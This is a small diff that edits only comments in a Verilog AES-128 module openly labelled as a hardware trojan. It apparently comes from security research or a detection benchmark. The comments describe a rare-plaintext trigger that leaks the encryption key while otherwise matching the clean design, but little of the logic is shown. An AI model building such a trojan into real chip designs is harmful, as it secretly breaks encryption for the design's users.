@@ -1,4 +1,3 @@
-// aes_128_trojan_leak.v
 // TROJAN VARIANT 1: Rare-Pattern Trigger + Key Leak Payload
 // -----------------------------------------------------------------------
 // Trigger:  Combinational. Watches the plaintext input. Only activates
@@ -88,7 +87,7 @@ module aes_128_trojan_leak (
                         round_cnt <= 4'd1;
                         fsm_state <= RUN;
 
-                        // ---- TROJAN PAYLOAD ----
+                        // TROJAN PAYLOAD
                         // Only writes non-zero when the rare trigger fires;
                         // otherwise behaves exactly like the clean design.
                         if (trojan_trigger)
